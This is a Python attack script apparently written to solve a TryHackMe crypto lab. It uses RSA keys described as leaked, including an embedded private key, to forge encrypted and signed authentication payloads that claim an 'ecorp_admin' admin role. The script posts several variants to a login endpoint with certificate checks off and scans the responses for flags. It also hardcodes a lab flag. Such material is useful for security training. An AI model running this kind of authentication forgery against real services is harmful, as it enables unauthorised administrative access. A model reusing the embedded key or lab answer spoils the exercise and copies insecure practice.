import argparse
import base64
import json
import os
import re
import time
import urllib.parse
from dataclasses import dataclass
from typing import Any

import requests
import urllib3
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Hash import SHA1, SHA256
from Crypto.PublicKey import RSA
from Crypto.Signature import pkcs1_15
from Crypto.Util.Padding import pad, unpad

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


SERVER_PUBLIC_KEY_PEM = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAvwpg2aBRLT9RftlcE8Qn
cmYi2weLT0EnHwXDsAE4A/zvR1dT9X4pFIrNXVnTKlIq8RBMilyoTn3GHUgJoFHG
GdqZfnCCHxf0IVX2NhpYi1HqZeXNCgqY4FtMH9WvjYEH2/twhUnvymT8egG3c50a
pT8sTsJrhWi2M+lhQ2yYXGecZHgAM7EddavpyTEdMw1xhIeeNHo1QxPjii1+dJIU
8iIJ8F3NQtukTe/EQyTjJGx7qDxVobO+njnnreqdqHZ6PqYD/6jlm9myXtUuJQqg
xMWwbxJNuS5Ay9JQSRGEfwEugJHuKEuofJdTkW/PibG9G3zaws4Nhmco8rw59j1r
bQIDAQAB
-----END PUBLIC KEY-----"""

CLIENT_PUBLIC_KEY_PEM = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAhxYZMHH4GTVQ3iqIC2M0
Ek06/MIAou1jXqanjLk00lyF9tkm85Sv4GJSrTzz8YticwpH2vVZ0y7E3dzOGQC+
ndK36Ny9Cif0ijD6vFZxlff8uWBsj5oGxNQ8vEdpZT9JuRrjuIIgKGoWV3jx7D24
TcbULjVvxIhinGWs+RkByCxEJNv9Gc6k9Hv/I0DJY6Z2zFKBinuMoU+CRkBge8O8
D7UKRYQ3AEnLVDvI923Di/Lcqz31HKTSha5EjWNF09YKpzrintvWD9GJwt2xP5uV
D5+2rQcT/+Ba1UWkLzNkvbWvrWYg1OYz/sVN7AZjC5WQcmOSohHlBpLxMxY32jB4
oQIDAQAB
-----END PUBLIC KEY-----"""

CLIENT_PRIVATE_KEY_PEM = """-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQCHFhkwcfgZNVDe
KogLYzQSTTr8wgCi7WNepqeMuTTSXIX22SbzlK/gYlKtPPPxi2JzCkfa9VnTLsTd
3M4ZAL6d0rfo3L0KJ/SKMPq8VnGV9/y5YGyPmgbE1Dy8R2llP0m5GuO4giAoahZX
ePHsPbhNxtQuNW/EiGKcZaz5GQHILEQk2/0ZzqT0e/8jQMljpnbMUoGKe4yhT4JG
QGB7w7wPtQpFhDcASctUO8j3bcOL8tyrPfUcpNKFrkSNY0XT1gqnOuKe29YP0YnC
3bE/m5UPn7atBxP/4FrVRaQvM2S9ta+tZiDU5jP+xU3sBmMLlZByY5KiEeUGkvEz
FjfaMHihAgMBAAECggEAAMiqAvD721dW47Gh7EU+L/Of1afxZ5CeoaXQWcOoutZh
qn5tRHdAv6HJbJb6nESKkMvi0apoG+6g4r/PaDer63v1sEuw2v9jKta8uzlaD5B+
uGOG4LzQSI3J2A625dEImjLlxrAmXC6sqFN3zaboaAbg+/9IUabYEePRBYlhpEv7
jP9IquO6pO3q13gDhot0fS7MM4sTfYKdPfb8qEwYCpsz3Qi7lFdbBqZxz/O/tkPq
giNJNJnHBLmXNOIdSCocMldIhZaPMmcDODPXAehmrru7l/Kh5hnfdK7Njcoph5T4
EJqAPOU7XVSyBeJKiKj1x/S+2jzLn8s3hOKCiBbbwQKBgQC+IvSbRXVA16he1yBE
183VRAALdVRDDTZcFALaexuNfly2SMU9SL/AAFrbNMaQ83y79XtAbDqk8C6YRhyi
z2Il9puVu8G61UB2lWzD5DvDYbb4OS+AroluYZQzeR1+02sZUkR4R0QnfNRQUtMR
3awfBIgf9B6Kr90Dnn/OLmQrYQKBgQC14V2azqz4Nkg4bg1LLk612H2fhwz38Evj
mlMmxAxdIqGJUz+wGb3tSGmGz7fPxmIga9k8n22nMpfZOyyGF9D93LVa+/9NeFEV
DWH5yph+xBN7SSyQMb+Q1xD6gTigLmkIynUXzcucgZB8oUGtexR2IoFu3Li7R9F3
HYpUpsKVQQKBgQCFB3X20TEJbhm6SW+lWwwDY7FYUv3ib/MRl1qrvCh55eg+DUoa
57RpRJZM+m7XadRiuY1DdLXPQtCG778HVmvIPfN7XsNb0eppTYCsyhnaSJq4r2IB
+ZvkI9eJ7/poCsnLDJklQk94BUmS7XAJ9vt/NC99k9JunD7ZUmL/QcwJ4QKBgQCG
a812gJEt0VCHBC8nBU5+70XJBVL8W8h6qrAR0osguluQ1soXKK9KE16KmDJNiV00
gQDI4Tt1etrnXeiGIkv/k4Mlf2EsrGOgn4dtyeHyro+HaolY+KuQLKMLwT1MhYBz
Us4/jYWSYd+bfMLBqFlzBgWLHe4Z2/ZfhqGZ9rWRAQKBgGX7uHz9nUaldXxt4lBn
94FR8D6FJxyKGr0/35XrPE3gc1nDJIQGl62E9vk8eVuBsFgqhm2ISroRSxeRI6ml
djzuBNJ/gQ5hxhj7ifv1ZakiwvxR2D5uJBPU5gve19Fyrq5On6R+KvVR4b+vcZ5A
0HuYuUaGZhtLd9ouH49CvSXj
-----END PRIVATE KEY-----"""


DEFAULT_ENDPOINTS = [
    "/authenticate",
]

FLAG_RE = re.compile(r"THM\{[^}]+\}")


def b64(data: bytes) -> str:
    return base64.b64encode(data).decode("ascii")


def ub64(value: str) -> bytes:
    return base64.b64decode(urllib.parse.unquote(value).encode("ascii"))


def rot13(text: str) -> str:
    out = []
    for c in text:
        if c.isalpha():
            base = ord("A") if c.isupper() else ord("a")
            out.append(chr(base + (ord(c) - base + 13) % 26))
        else:
            out.append(c)
    return "".join(out)


def try_json_loads(text: str) -> dict[str, Any] | None:
    try:
        obj = json.loads(text)
    except json.JSONDecodeError:
        return None
    return obj if isinstance(obj, dict) else None


def extract_flag(text: str) -> str | None:
    m = FLAG_RE.search(text)
    return m.group(0) if m else None


def rsa_encrypt_oaep(pub_key: RSA.RsaKey, data: bytes) -> bytes:
    return PKCS1_OAEP.new(pub_key).encrypt(data)


def rsa_decrypt_oaep(priv_key: RSA.RsaKey, data: bytes) -> bytes:
    return PKCS1_OAEP.new(priv_key).decrypt(data)


def rsa_sign(data: bytes, priv_key: RSA.RsaKey, algo: str = "sha256") -> bytes:
    if algo.lower() == "sha1":
        digest = SHA1.new(data)
    else:
        digest = SHA256.new(data)
    return pkcs1_15.new(priv_key).sign(digest)


def aes_cbc_encrypt(plain: bytes, key: bytes, iv: bytes) -> bytes:
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return cipher.encrypt(pad(plain, AES.block_size))


def aes_cbc_decrypt(ciphertext: bytes, key: bytes, iv: bytes) -> bytes:
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return unpad(cipher.decrypt(ciphertext), AES.block_size)


@dataclass
class ForgedRequest:
    json_variants: list[dict[str, Any]]
    form_variants: list[dict[str, str]]
    aes_key: bytes
    iv: bytes


def build_forged_payload(username: str = "ecorp_admin") -> ForgedRequest:
    server_pub = RSA.import_key(SERVER_PUBLIC_KEY_PEM)
    client_priv = RSA.import_key(CLIENT_PRIVATE_KEY_PEM)

    secret = "THM{Breaking.Custom.Crypto.Is.Fun}"
    classic_plain = f"username={rot13(username)}&secret={rot13(secret)}".encode("utf-8")

    auth_doc = {
        "username": username,
        "role": "admin",
        "is_admin": True,
        "authenticated": True,
        "iat": int(time.time()),
        "nonce": b64(os.urandom(8)),
    }

    plain = json.dumps(auth_doc, separators=(",", ":")).encode("utf-8")
    aes_key = os.urandom(16)
    iv = b"0000000000000000"
    ciphertext = aes_cbc_encrypt(plain, aes_key, iv)
    classic_ct = aes_cbc_encrypt(classic_plain, aes_key, iv)

    enc_key = rsa_encrypt_oaep(server_pub, aes_key)

    signed_blob = enc_key + iv + ciphertext
    signature_sha256 = rsa_sign(signed_blob, client_priv, algo="sha256")
    signature_sha1 = rsa_sign(signed_blob, client_priv, algo="sha1")

    j1 = {
        "ek": b64(enc_key),
        "iv": b64(iv),
        "ct": b64(ciphertext),
        "sig": b64(signature_sha256),
        "username": username,
    }
    j2 = {
        "key": b64(enc_key),
        "iv": b64(iv),
        "data": b64(ciphertext),
        "signature": b64(signature_sha256),
        "user": username,
    }
    j3 = {
        "encryptedKey": b64(enc_key),
        "ciphertext": b64(ciphertext),
        "iv": b64(iv),
        "signature": b64(signature_sha1),
        "algo": "RSA-OAEP+AES-CBC",
    }

    f1 = {
        "mac": b64(enc_key),
        "data": b64(ciphertext),
        "iv": b64(iv),
        "sig": b64(signature_sha256),
    }
    f2 = {
        "ek": b64(enc_key),
        "ct": b64(ciphertext),
        "iv": b64(iv),
        "signature": b64(signature_sha1),
    }

    # Hybrid variant: required legacy fields + leaked key artefacts.
    # The target accepts mac/data, but leaked keys let us forge sig/ek as well.
    f3 = {
        "mac": b64(aes_key),
        "data": b64(classic_ct),
        "ek": b64(enc_key),
        "iv": b64(iv),
        "sig": b64(rsa_sign(classic_plain + classic_ct, client_priv, algo="sha256")),
    }

    return ForgedRequest(
        json_variants=[j1, j2, j3],
        form_variants=[f1, f2, f3],
        aes_key=aes_key,
        iv=iv,
    )


def try_decode_response(resp: requests.Response, req_aes_key: bytes) -> str | None:
    text = resp.text
    if not text:
        return None

    as_json = try_json_loads(text)
    if as_json:
        for ck_name in ("ct", "ciphertext", "data", "result"):
            if ck_name not in as_json:
                continue
            ctb64 = as_json.get(ck_name)
            if not isinstance(ctb64, str):
                continue

            iv_value = as_json.get("iv")
            if isinstance(iv_value, str):
                iv = ub64(iv_value)
            else:
                iv = b"0000000000000000"

            try:
                ct = ub64(ctb64)
                plain = aes_cbc_decrypt(ct, req_aes_key, iv).decode("utf-8", errors="replace")
                return plain
            except Exception:
                continue

    result_match = re.search(r"(?:result|data|ct)=([^&\s]+)", text)
    if result_match:
        try:
            ct = ub64(result_match.group(1))
            plain = aes_cbc_decrypt(ct, req_aes_key, b"0000000000000000").decode("utf-8", errors="replace")
            return plain
        except Exception:
            return None

    return None


def send_with_fallback(
    session: requests.Session,
    url: str,
    *,
    json_data: dict[str, Any] | None = None,
    form_data: dict[str, str] | None = None,
    timeout: int = 15,
) -> requests.Response | None:
    headers = {"Content-Type": "application/json" if json_data is not None else "application/x-www-form-urlencoded"}
    try:
        if json_data is not None:
            return session.post(url, json=json_data, headers=headers, timeout=timeout, verify=False)
        return session.post(url, data=form_data, headers=headers, timeout=timeout, verify=False)
    except requests.exceptions.SSLError as exc:
        if "WRONG_VERSION_NUMBER" not in str(exc):
            print(f"[-] SSL error on {url}: {exc}")
            return None

        if url.startswith("https://"):
            retry_url = "http://" + url[len("https://") :]
        else:
            retry_url = "https://" + url[len("http://") :]

        print(f"[*] SSL wrong version, retrying with alternate scheme: {retry_url}")
        try:
            if json_data is not None:
                return session.post(retry_url, json=json_data, headers=headers, timeout=timeout, verify=False)
            return session.post(retry_url, data=form_data, headers=headers, timeout=timeout, verify=False)
        except requests.RequestException as inner_exc:
            print(f"[-] Retry failed on {retry_url}: {inner_exc}")
            return None
    except requests.RequestException as exc:
        print(f"[-] Request failed on {url}: {exc}")
        return None


def attack(base: str, endpoints: list[str], username: str) -> str | None:
    forged = build_forged_payload(username=username)

    with requests.Session() as session:
        for ep in endpoints:
            target = f"{base.rstrip('/')}/{ep.lstrip('/')}"

            for idx, body in enumerate(forged.json_variants, start=1):
                print(f"[*] Trying JSON variant {idx} -> {target}")
                resp = send_with_fallback(session, target, json_data=body)
                if resp is None:
                    continue
                print(f"    HTTP {resp.status_code} | {len(resp.text)} bytes")

                flag = extract_flag(resp.text)
                if flag:
                    print(f"[+] Flag found in raw response: {flag}")
                    return flag

                decoded = try_decode_response(resp, forged.aes_key)
                if decoded:
                    print(f"    Decoded response: {decoded}")
                    flag = extract_flag(decoded)
                    if flag:
                        print(f"[+] Flag found in decoded response: {flag}")
                        return flag
                    decoded_rot13 = rot13(decoded)
                    flag = extract_flag(decoded_rot13)
                    if flag:
                        print(f"[+] Flag found in ROT13-decoded response: {flag}")
                        return flag

            for idx, body in enumerate(forged.form_variants, start=1):
                print(f"[*] Trying FORM variant {idx} -> {target}")
                resp = send_with_fallback(session, target, form_data=body)
                if resp is None:
                    continue
                print(f"    HTTP {resp.status_code} | {len(resp.text)} bytes")

                flag = extract_flag(resp.text)
                if flag:
                    print(f"[+] Flag found in raw response: {flag}")
                    return flag

                decoded = try_decode_response(resp, forged.aes_key)
                if decoded:
                    print(f"    Decoded response: {decoded}")
                    flag = extract_flag(decoded)
                    if flag:
                        print(f"[+] Flag found in decoded response: {flag}")
                        return flag
                    decoded_rot13 = rot13(decoded)
                    flag = extract_flag(decoded_rot13)
                    if flag:
                        print(f"[+] Flag found in ROT13-decoded response: {flag}")
                        return flag

    return None


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Forge encrypted auth payloads using leaked RSA keys and hunt for THM flag."
    )
    parser.add_argument(
        "--base",
        default="https://10.81.188.92:8443",
        help="Base URL of target web app, e.g. http://python.thm/labs/lab5",
    )
    parser.add_argument(
        "--username",
        default="ecorp_admin",
        help="Username to embed in forged authenticated token/payload.",
    )
    parser.add_argument(
        "--endpoints",
        nargs="*",
        default=DEFAULT_ENDPOINTS,
        help="Authentication endpoints to test.",
    )
    return parser.parse_args()


def main() -> None:
    args = parse_args()
    print(f"[*] Target base: {args.base}")
    print(f"[*] Username: {args.username}")
    print(f"[*] Endpoints: {args.endpoints}")

    flag = attack(base=args.base, endpoints=args.endpoints, username=args.username)
    if flag:
        print(f"\n[+] FINAL FLAG: {flag}")
        return

    print("\n[-] No flag extracted yet.")
    print("[-] If your lab uses a virtual host/path, rerun with --base and --endpoints from Burp capture.")


if __name__ == "__main__":
    main()

    